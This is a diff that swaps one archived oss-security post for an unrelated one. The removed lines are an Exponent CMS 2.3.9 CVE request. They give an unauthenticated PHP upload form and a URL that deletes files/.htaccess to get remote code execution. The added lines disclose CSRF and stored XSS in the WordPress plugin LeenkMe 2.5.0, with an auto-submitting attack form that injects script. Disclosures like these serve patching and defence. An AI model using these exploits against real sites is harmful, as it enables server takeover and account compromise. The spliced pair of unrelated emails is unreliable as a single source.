@@ -1,227 +1,126 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/30/4
-Message-ID: <CAFkM3a+W0AVRx27OW4_1ZVkghYHGmb1MrukXnO+SjUOZ=Vu=DQ@mail.gmail.com>
-Date: Fri, 30 Sep 2016 16:52:15 +0800
-From: fyth <fyth.cnss@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/16/4
+Message-ID: <CAOmn9FQwgG8PfecdkDLnqD8cGWTg0TKXudGs6-4J1zkFwB4+Pw@mail.gmail.com>
+Date: Sat, 16 Apr 2016 13:55:38 +0530
+From: shravan kumar <cor3sm4sh3r@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE Request: File Upload & File Delete lead to Unauthorized RCE in Exponent CMS 2.3.9
+Subject: CSRF and Stored XSS in a WORDPRESS Plugin LeenkMe version 2.5.0.
 Content-Type: text/plain; charset=utf-8
 
-CVE Request: File Upload & File Delete lead to Unauthorized RCE in Exponent
-CMS 2.3.9
+Hello ,
 
-Hi, I reported two vulnerabilities to the ExponentCMS team on 20th Sept
-2016:
+I would like to disclose CSRF and stored XSS vulnerability in Wordpress
+plugin LeenkMe version 2.5.0.
 
+The plugin can be found at https://wordpress.org/plugins/leenkme/
 
-1.Arbitrary File Upload vulnerability
+In the page wp-content/plugins/leenkme/facebook.php
 
-/framework/modules/file/controllers/fileController.php
+XSS vulnerable Fields are :
 
-line 529-565
-
-```
-
-    public function upload() {
-
-        // upload the file, but don't save the record yet...
-        if ($this->params['resize'] != 'false') {
-            $maxwidth = $this->params['max_width'];
-        } else {
-            $maxwidth = null;
-        }
-        $file =
-expFile::fileUpload('Filedata',false,false,null,null,$maxwidth);
-        // since most likely this function will only get hit via flash in
-YUI Uploader
-        // and since Flash can't pass cookies, we lose the knowledge of our
-$user
-        // so we're passing the user's ID in as $_POST data. We then
-instantiate a new $user,
-        // and then assign $user->id to $file->poster so we have an audit
-trail for the upload
-
-        if (is_object($file)) {
-            $resized = !empty($file->resized) ? true : false;
-            $user = new user($this->params['usrid']);
-            $file->poster = $user->id;
-            $file->posted = $file->last_accessed = time();
-            $file->save();
-            if (!empty($this->params['cat'])) {
-                $expcat = new expCat($this->params['cat']);
-                $params['expCat'][0] = $expcat->id;
-                $file->update($params);
-            }
-
-            // a echo so YUI Uploader is notified of the function's
-completion
-            if ($resized) {
-                echo gt('File resized and then saved');
-            } else {
-                echo gt('File saved');
-            }
-        } else {
-            echo gt('File was NOT uploaded!');
-//            flash('error',gt('File was not uploaded!'));
-        }
-    }
+   - facebook_message
+   - facebook_linkname
+   - facebook_caption
+   - facebook_description
+   - default_image
+   - _wp_http_referer
 
 
-```
+This CSRF is tested on latest wordpress installation 4.4.2 using firefox
+browser.
 
-An unauthorized user can upload any file into the /files folder under
-Exponent directory, including malicious files such as PHP files.
-
-Exponent team put a .htaccess file under /files folder to prevent these
-malicious files from being executed with the following content:
-```
-<FilesMatch "\.(php|phps|pl|py|jsp|asp|htm|html|shtml|sh|cgi|txt)$">
-    ForceType text/plain
-</FilesMatch>
-
-```
-But, if we can somehow get rid of this .htaccess file, we can get a RCE
-vulnerability.
-
-2.Arbitrary File Delete vulnerability:
-
-/framework/modules/forms/controllers/formsController.php
-
-
-line 1939-2010:
-```
-    public function import_csv_data_add() {
-        global $user;
-
-        $line_end = ini_get('auto_detect_line_endings');
-        ini_set('auto_detect_line_endings',TRUE);
-        $file = fopen(BASE . $this->params["filename"], "r");
-        $recordsdone = 0;
-        $linenum = 1;
-        $f = new forms($this->params['forms_id']);
-        $f->updateTable();
-
-        $fields = array();
-        $multi_item_control_items = array();
-        $multi_item_control_ids = array();
-        foreach ($f->forms_control as $control) {
-            $fields[$control->name] = expUnserialize($control->data);
-            $ctltype = get_class($fields[$control->name]);
-            if
-(in_array($ctltype,array('radiogroupcontrol','dropdowncontrol'))) {
-                if
-(!array_key_exists($control->id,$multi_item_control_items)) {
-                    $multi_item_control_items[$control->name] = null;
-                    $multi_item_control_ids[$control->name] = $control->id;
-                }
-            }
-        }
-
-        while (($filedata = fgetcsv($file, 2000,
-$this->params["delimiter"])) != false) {
-            if ($linenum >= $this->params["rowstart"] &&
-in_array($linenum,$this->params['importrecord'])) {
-                $i = 0;
-                $db_data = new stdClass();
-                $db_data->ip = '';
-                $db_data->user_id = $user->id;
-                $db_data->timestamp = time();
-                $db_data->referrer = '';
-                $db_data->location_data = '';
-                foreach ($filedata as $field) {
-                    if (!empty($this->params["column"][$i]) &&
-$this->params["column"][$i] != "none") {
-                        $colname = $this->params["column"][$i];
-                        $control_type = get_class($fields[$colname]);
-                        $params[$colname] = $field;
-                        $def = call_user_func(array($control_type,
-"getFieldDefinition"));
-                        if (!empty($def)) {
-                            $db_data->$colname =
-call_user_func(array($control_type, 'convertData'), $colname, $params);
-                        }
-                        if (!empty($db_data->$colname) &&
-array_key_exists($colname,$multi_item_control_items) &&
-!in_array($db_data->$colname,$multi_item_control_items[$colname])) {
-                            $multi_item_control_items[$colname][] =
-$db_data->$colname;
-                        }
-                    }
-                    $i++;
-                }
-                $f->insertRecord($db_data);
-                $recordsdone++;
-            }
-            $linenum++;
-        }
-
-        fclose($file);
-        ini_set('auto_detect_line_endings',$line_end);
-
-        // update multi-item forms controls
-        if (!empty($multi_item_control_ids)) {
-            foreach ($multi_item_control_ids as $key=>$control_id) {
-                $fc = new forms_control($control_id);
-                $ctl = expUnserialize($fc->data);
-                $ctl->items = $multi_item_control_items[$key];
-                $fc->data = serialize($ctl);
-                $fc->update();
-            }
-        }
-        unlink(BASE . $this->params["filename"]);
-        flash('notice', $recordsdone.' '.gt('Records Imported'));
-        expHistory::back();
-    }
-```
-$this->params["filename"] is basically $_GET['filename'], without any
-sanitization.
-
-
-
-
-Exploit:
-
-The first step is to upload a php file using the following html, lets call
-it test.php
-
+The Code for CSRF.html is
 
 <html>
-<body>
-
-<form action="
-http://yourexponentcms/?controller=file&action=upload&resize=false"
-method="post"
-enctype="multipart/form-data">
-Filename:
-<input type="file" name="Filedata" id="file">
-
-<input type="submit" name="submit" value="Submit">
-</form>
-
-</body>
+  <body onload="document.forms['xss'].submit()" >
+    <form name="xss" action="
+http://127.0.0.1/wp/wp-admin/admin.php?page=leenkme_facebook" method="POST">
+      <input type="hidden" name="facebook_profile" value="on" />
+      <input type="hidden" name="fb_publish_wpnonce" value="" />
+      <input type="hidden" name="_wp_http_referer" value="XSS" />
+      <input type="hidden" name="facebook_message" value="XSS" />
+      <input type="hidden" name="facebook_linkname" value="XSS" />
+      <input type="hidden" name="facebook_caption" value="XSS" />
+      <input type="hidden" name="facebook_description" value="
+</textarea><script>prompt();</script>" />
+      <input type="hidden" name="default_image" value="XSS" />
+      <input type="hidden" name="message_preference" value="author" />
+      <input type="hidden" name="clude" value="in" />
+      <input type="hidden" name="publish_cats&#91;&#93;" value="0" />
+      <input type="hidden" name="update_facebook_settings"
+value="Save&#32;Settings" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
 </html>
 
 
-And the second step is to delete the .htaccess file.
-http://yourexponentcms/index.php?controller=forms&action=import_csv_data_add&filename=files/.htaccess
+The vulnerable page is
+
+wp-content/plugins/leenkme/facebook.php
+
+The vulnerable code producing XSS is
 
 
-And now your http://yourexponentcms/files/test.php will be executed without
-any obstacles.
+if ( !empty( $_REQUEST['facebook_message'] ) )
+$user_settings['facebook_message'] = $_REQUEST['facebook_message'];
+else
+$user_settings['facebook_message'] = '';
+if ( !empty( $_REQUEST['facebook_linkname'] ) )
+$user_settings['facebook_linkname'] = $_REQUEST['facebook_linkname'];
+else
+$user_settings['facebook_linkname'] = '';
+if ( !empty( $_REQUEST['facebook_caption'] ) )
+$user_settings['facebook_caption'] = $_REQUEST['facebook_caption'];
+else
+$user_settings['facebook_caption'] = '';
+if ( !empty( $_REQUEST['facebook_description'] ) )
+$user_settings['facebook_description'] = $_REQUEST['facebook_description'];
 
 
+-------------------------
+-------------------------
+-------------------------
+snip
+------------------------
+-------------------------
+--------------------------
+
+<td><textarea name="facebook_message" style="width: 500px;"
+maxlength="400"><?php
+echo $user_settings['facebook_message']; ?></textarea></td>
+                            </tr>
+                            <tr>
+                             <td><?php _e( 'Default Link Name:', 'leenkme'
+); ?></td>
+                                <td><input name="facebook_linkname"
+type="text" style="width: 500px;" value="<?php echo
+$user_settings['facebook_linkname']; ?>"  maxlength="100"/></td>
+                            </tr>
+                            <tr>
+                             <td><?php _e( 'Default Caption:', 'leenkme' );
+?></td>
+                                <td><input name="facebook_caption"
+type="text" style="width: 500px;" value="<?php echo
+$user_settings['facebook_caption']; ?>" maxlength="100"/></td>
+                            </tr>
+                            <tr>
+                             <td style='vertical-align: top; padding-top:
+5px;'><?php _e( 'Default Description:', 'leenkme' ); ?></td>
+                                <td><textarea name="facebook_description"
+style="width: 500px;" maxlength="300"><?php echo
+$user_settings['facebook_description']; ?></textarea></td>
 
 
-And Now, these vulnerabilities have been fixed.
-https://exponentcms.lighthouseapp.com/projects/61783/changesets/fdafb5ec97838e4edbd685f587f28d3174ebb3db
-https://github.com/exponentcms/exponent-cms/commit/fdafb5ec97838e4edbd685f587f28d3174ebb3db
+The code used to protect against CSRF that is the anti csrf token used is
 
-This issue was reported by Wang Chang of silence.com.cn Inc. and I would
-like
-to request CVE ids for these issues (if not done so).
+<?php wp_nonce_field( 'fb_publish', 'fb_publish_wpnonce' ); ?>
 
-Thank you.
----------------------------------http://www.silence.com.cn
-wangchang#silence.com.cn
-PKAV Team
+
+But this code is not protecting against the CSRF, the form get submitted
+successfully with out any error even though the fb_publish_wpnonce is kept
+empty resulting in CSRF vulnerability.
+
+-- 
+Shravan Kumar
 
